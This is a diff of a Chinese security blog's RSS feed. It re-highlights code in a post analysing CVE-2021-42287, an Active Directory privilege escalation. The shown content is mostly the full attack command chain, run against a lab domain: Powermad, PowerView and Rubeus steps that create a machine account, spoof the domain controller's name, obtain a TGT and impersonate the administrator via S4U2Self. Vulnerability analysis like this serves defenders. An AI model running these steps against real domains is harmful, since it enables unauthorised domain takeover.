@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞 on T1ck1ng's Blog</title><link>https://blog.rm-rf.icu/categories/%E6%BC%8F%E6%B4%9E/</link><description>Recent content in 漏洞 on T1ck1ng's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 09 Sep 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.rm-rf.icu/categories/%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2021-42287_域提权漏洞分析</title><link>https://blog.rm-rf.icu/p/cve-2021-42287_%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link><pubDate>Wed, 09 Sep 2020 00:00:00 +0000</pubDate><guid>https://blog.rm-rf.icu/p/cve-2021-42287_%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid><description>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220118141506204.png" alt="Featured image of post CVE-2021-42287_域提权漏洞分析" />&lt;h1 id="cve-2021-42287">CVE-2021-42287&lt;/h1>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞 on T1ck1ng's Blog</title><link>https://blog.rm-rf.icu/categories/%E6%BC%8F%E6%B4%9E/</link><description>Recent content in 漏洞 on T1ck1ng's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 09 Feb 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.rm-rf.icu/categories/%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2021-42287_域提权漏洞分析</title><link>https://blog.rm-rf.icu/p/cve-2021-42287_%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link><pubDate>Wed, 09 Feb 2022 00:00:00 +0000</pubDate><guid>https://blog.rm-rf.icu/p/cve-2021-42287_%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid><description>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220118141506204.png" alt="Featured image of post CVE-2021-42287_域提权漏洞分析" />&lt;h1 id="cve-2021-42287">CVE-2021-42287&lt;/h1>
 &lt;h2 id="0x01-kerberos认证过程">0x01 Kerberos认证过程&lt;/h2>
 &lt;div class="highlight">&lt;div class="chroma">
 &lt;table class="lntable">&lt;tr>&lt;td class="lntd">
@@ -51,20 +51,23 @@ alt="image-20220118141506204"
 &lt;/span>&lt;span class="lnt">3
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">Set-ExecutionPolicy Bypass -Scope Process
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Import-Module .&lt;span class="se">\P&lt;/span>owermad.ps1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">New-MachineAccount -MachineAccount work -Domain doge.com -Verbose
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ExecutionPolicy&lt;/span> &lt;span class="n">Bypass&lt;/span> &lt;span class="n">-Scope&lt;/span> &lt;span class="k">Process&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">Powermad&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-MachineAccount&lt;/span> &lt;span class="n">-MachineAccount&lt;/span> &lt;span class="n">work&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="n">-Verbose&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220120095108327.png"
+&lt;/div>&lt;ol>
+&lt;li>&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220120095108327.png"
 loading="lazy"
 alt="image-20220120095108327"
 >&lt;/p>
-&lt;/li>
+&lt;ol>
 &lt;li>
 &lt;p>清除SPN&lt;/p>
-&lt;/li>
-&lt;/ol>
 &lt;div class="highlight">&lt;div class="chroma">
 &lt;table class="lntable">&lt;tr>&lt;td class="lntd">
 &lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
@@ -73,17 +76,17 @@ alt="image-20220120095108327"
 &lt;/span>&lt;span class="lnt">4
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#清除spn，如果不清除，修改samAccountName的时候会尝试修改域控的SPN，导致失败&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">setspn -T doge.com -Q */*
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Import-Module .&lt;span class="se">\P&lt;/span>owerView.ps1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Set-DomainObject &lt;span class="s2">&amp;#34;CN=work,CN=Computers,DC=doge,DC=com&amp;#34;&lt;/span> -Clear &lt;span class="s1">&amp;#39;serviceprincipalname&amp;#39;&lt;/span> -Verbose
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c">#清除spn，如果不清除，修改samAccountName的时候会尝试修改域控的SPN，导致失败&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">setspn&lt;/span> &lt;span class="n">-T&lt;/span> &lt;span class="n">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="n">-Q&lt;/span> &lt;span class="p">*/*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">PowerView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainObject&lt;/span> &lt;span class="s2">&amp;#34;CN=work,CN=Computers,DC=doge,DC=com&amp;#34;&lt;/span> &lt;span class="n">-Clear&lt;/span> &lt;span class="s1">&amp;#39;serviceprincipalname&amp;#39;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220120104743755.png"
 loading="lazy"
 alt="image-20220120104743755"
 >&lt;/p>
-&lt;ol start="3">
+&lt;/li>
 &lt;li>
 &lt;p>重设机器名为域控名&lt;/p>
 &lt;div class="highlight">&lt;div class="chroma">
@@ -91,7 +94,7 @@ alt="image-20220120104743755"
 &lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Set-MachineAccountAttribute -MachineAccount work -Value &lt;span class="s2">&amp;#34;ad&amp;#34;&lt;/span> -Attribute samaccountname -Verbose
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MachineAccountAttribute&lt;/span> &lt;span class="n">-MachineAccount&lt;/span> &lt;span class="n">work&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="s2">&amp;#34;ad&amp;#34;&lt;/span> &lt;span class="n">-Attribute&lt;/span> &lt;span class="n">samaccountname&lt;/span> &lt;span class="n">-Verbose&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;/li>
@@ -102,7 +105,7 @@ alt="image-20220120104743755"
 &lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">./Rubeus.exe asktgt /user:ad /password:Test123 /domian:doge.com /dc:ad.doge.com /nowrap
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">./&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">asktgt&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">ad&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">Test123&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domian&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">dc&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">ad&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">nowrap&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220120111003789.png"
@@ -117,7 +120,7 @@ alt="image-20220120111003789"
 &lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">Set-MachineAccountAttribute -MachineAccount work -Value &lt;span class="s2">&amp;#34;work&amp;#34;&lt;/span> -Attribute samaccountname -Verbose
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MachineAccountAttribute&lt;/span> &lt;span class="n">-MachineAccount&lt;/span> &lt;span class="n">work&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="s2">&amp;#34;work&amp;#34;&lt;/span> &lt;span class="n">-Attribute&lt;/span> &lt;span class="n">samaccountname&lt;/span> &lt;span class="n">-Verbose&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;/li>
@@ -128,7 +131,7 @@ alt="image-20220120111003789"
 &lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">./Rubeus.exe s4u /self /impersonateuser:&lt;span class="s2">&amp;#34;administrator&amp;#34;&lt;/span> /altservice:&lt;span class="s2">&amp;#34;cifs/ad.doge.com&amp;#34;&lt;/span> /dc:&lt;span class="s2">&amp;#34;ad.doge.com&amp;#34;&lt;/span> /ptt /ticket:&lt;span class="o">[&lt;/span>Base64 TGT&lt;span class="o">]&lt;/span>
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">./&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">s4u&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">self&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">impersonateuser&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;administrator&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">altservice&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;cifs/ad.doge.com&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">dc&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;ad.doge.com&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ptt&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ticket&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="no">Base64 TGT&lt;/span>&lt;span class="p">]&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;/li>
@@ -235,34 +238,34 @@ alt="PAC_LOGON_INFO"
 &lt;/span>&lt;span class="lnt">28
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">Set-ExecutionPolicy Bypass -Scope Process
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Import-Module .&lt;span class="se">\P&lt;/span>owermad.ps1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">New-MachineAccount -MachineAccount work -Domain doge.com -Verbose
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ExecutionPolicy&lt;/span> &lt;span class="n">Bypass&lt;/span> &lt;span class="n">-Scope&lt;/span> &lt;span class="k">Process&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">Powermad&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-MachineAccount&lt;/span> &lt;span class="n">-MachineAccount&lt;/span> &lt;span class="n">work&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="n">-Verbose&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">setspn -T doge.com -Q */*
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Import-Module .&lt;span class="se">\P&lt;/span>owerView.ps1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Set-DomainObject &lt;span class="s2">&amp;#34;CN=work,CN=Computers,DC=doge,DC=com&amp;#34;&lt;/span> -Clear &lt;span class="s1">&amp;#39;serviceprincipalname&amp;#39;&lt;/span> -Verbose
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Set-MachineAccountAttribute -MachineAccount work -Value &lt;span class="s2">&amp;#34;ad&amp;#34;&lt;/span> -Attribute samaccountname -Verbose
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./Rubeus.exe asktgt /user:ad /password:Test123 /domian:doge.com /dc:ad.doge.com /nowrap
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Set-MachineAccountAttribute -MachineAccount work -Value &lt;span class="s2">&amp;#34;work&amp;#34;&lt;/span> -Attribute samaccountname -Verbose
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./Rubeus.exe s4u /self /impersonateuser:&lt;span class="s2">&amp;#34;administrator&amp;#34;&lt;/span> /altservice:&lt;span class="s2">&amp;#34;cifs/ad.doge.com&amp;#34;&lt;/span> /dc:&lt;span class="s2">&amp;#34;ad.doge.com&amp;#34;&lt;/span> /ptt /ticket:
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 创建机器账户work&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Set-ExecutionPolicy Bypass -Scope Process
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Import-Module .&lt;span class="se">\P&lt;/span>owermad.ps1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">New-MachineAccount -MachineAccount work -Domain doge.com -Verbose
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#清除spn，如果不清除，修改samAccountName的时候会尝试修改域控的SPN，导致失败&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">setspn -T doge.com -Q */*
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Import-Module .&lt;span class="se">\P&lt;/span>owerView.ps1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Set-DomainObject &lt;span class="s2">&amp;#34;CN=work,CN=Computers,DC=doge,DC=com&amp;#34;&lt;/span> -Clear &lt;span class="s1">&amp;#39;serviceprincipalname&amp;#39;&lt;/span> -Verbose
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#将机器用户名修改为域控机器名，不带$&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Set-MachineAccountAttribute -MachineAccount work -Value &lt;span class="s2">&amp;#34;ad&amp;#34;&lt;/span> -Attribute samaccountname -Verbose
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#申请tgt&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./Rubeus.exe asktgt /user:ad /password:Test123 /domian:doge.com /dc:ad.doge.com /nowrap
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#将机器用户名重置为原来的用户名&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Set-MachineAccountAttribute -MachineAccount work -Value &lt;span class="s2">&amp;#34;work&amp;#34;&lt;/span> -Attribute samaccountname -Verbose
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#通过S4U2Self获取st&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./Rubeus.exe s4u /self /impersonateuser:&lt;span class="s2">&amp;#34;administrator&amp;#34;&lt;/span> /altservice:&lt;span class="s2">&amp;#34;cifs/ad.doge.com&amp;#34;&lt;/span> /dc:&lt;span class="s2">&amp;#34;ad.doge.com&amp;#34;&lt;/span> /ptt /ticket:&lt;span class="o">[&lt;/span>Base64 TGT&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">setspn&lt;/span> &lt;span class="n">-T&lt;/span> &lt;span class="n">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="n">-Q&lt;/span> &lt;span class="p">*/*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">PowerView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainObject&lt;/span> &lt;span class="s2">&amp;#34;CN=work,CN=Computers,DC=doge,DC=com&amp;#34;&lt;/span> &lt;span class="n">-Clear&lt;/span> &lt;span class="s1">&amp;#39;serviceprincipalname&amp;#39;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MachineAccountAttribute&lt;/span> &lt;span class="n">-MachineAccount&lt;/span> &lt;span class="n">work&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="s2">&amp;#34;ad&amp;#34;&lt;/span> &lt;span class="n">-Attribute&lt;/span> &lt;span class="n">samaccountname&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">./&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">asktgt&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">ad&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">Test123&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domian&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">dc&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">ad&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">nowrap&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MachineAccountAttribute&lt;/span> &lt;span class="n">-MachineAccount&lt;/span> &lt;span class="n">work&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="s2">&amp;#34;work&amp;#34;&lt;/span> &lt;span class="n">-Attribute&lt;/span> &lt;span class="n">samaccountname&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">./&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">s4u&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">self&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">impersonateuser&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;administrator&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">altservice&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;cifs/ad.doge.com&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">dc&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;ad.doge.com&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ptt&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ticket&lt;/span>&lt;span class="err">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 创建机器账户work&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ExecutionPolicy&lt;/span> &lt;span class="n">Bypass&lt;/span> &lt;span class="n">-Scope&lt;/span> &lt;span class="k">Process&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">Powermad&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-MachineAccount&lt;/span> &lt;span class="n">-MachineAccount&lt;/span> &lt;span class="n">work&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">#清除spn，如果不清除，修改samAccountName的时候会尝试修改域控的SPN，导致失败&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">setspn&lt;/span> &lt;span class="n">-T&lt;/span> &lt;span class="n">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="n">-Q&lt;/span> &lt;span class="p">*/*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">PowerView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainObject&lt;/span> &lt;span class="s2">&amp;#34;CN=work,CN=Computers,DC=doge,DC=com&amp;#34;&lt;/span> &lt;span class="n">-Clear&lt;/span> &lt;span class="s1">&amp;#39;serviceprincipalname&amp;#39;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">#将机器用户名修改为域控机器名，不带$&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MachineAccountAttribute&lt;/span> &lt;span class="n">-MachineAccount&lt;/span> &lt;span class="n">work&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="s2">&amp;#34;ad&amp;#34;&lt;/span> &lt;span class="n">-Attribute&lt;/span> &lt;span class="n">samaccountname&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">#申请tgt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">./&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">asktgt&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">ad&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">Test123&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domian&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">dc&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">ad&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">doge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">nowrap&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">#将机器用户名重置为原来的用户名&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MachineAccountAttribute&lt;/span> &lt;span class="n">-MachineAccount&lt;/span> &lt;span class="n">work&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="s2">&amp;#34;work&amp;#34;&lt;/span> &lt;span class="n">-Attribute&lt;/span> &lt;span class="n">samaccountname&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">#通过S4U2Self获取st&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">./&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">s4u&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">self&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">impersonateuser&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;administrator&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">altservice&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;cifs/ad.doge.com&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">dc&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;ad.doge.com&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ptt&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ticket&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="no">Base64 TGT&lt;/span>&lt;span class="p">]&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
